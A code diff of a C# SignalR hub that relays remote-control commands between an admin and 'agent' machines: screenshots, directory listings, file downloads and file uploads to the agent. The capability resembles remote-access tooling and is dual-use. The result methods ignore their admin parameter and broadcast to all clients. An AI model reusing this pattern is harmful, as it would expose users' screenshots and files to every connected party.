@@ -124,10 +124,25 @@ namespace WebApp.Hubs
             await Clients.All.SendAsync("ReceiveScreenshot", Context.ConnectionId, base64Image);
         }
 
-        // --- NEW: File Download ---
+        // --- NEW: File Manager ---
+        public async Task RequestDirectoryContents(string targetConnectionId, string path)
+        {
+            await Clients.Client(targetConnectionId).SendAsync("GetDirectoryContentsCommand", path);
+        }
+
+        public async Task SendDirectoryContentsResult(string adminConnectionId, string path, string json)
+        {
+            await Clients.All.SendAsync("ReceiveDirectoryContents", Context.ConnectionId, path, json);
+        }
+
         public async Task RequestFileDownload(string targetConnectionId, string filePath)
         {
             await Clients.Client(targetConnectionId).SendAsync("DownloadFileCommand", filePath);
+        }
+
+        public async Task UploadFileToAgent(string targetConnectionId, string dirPath, string fileName, string base64Data)
+        {
+            await Clients.Client(targetConnectionId).SendAsync("ReceiveFileUploadCommand", dirPath, fileName, base64Data);
         }
 
         public async Task SendFileResult(string adminConnectionId, string fileName, string base64Data)
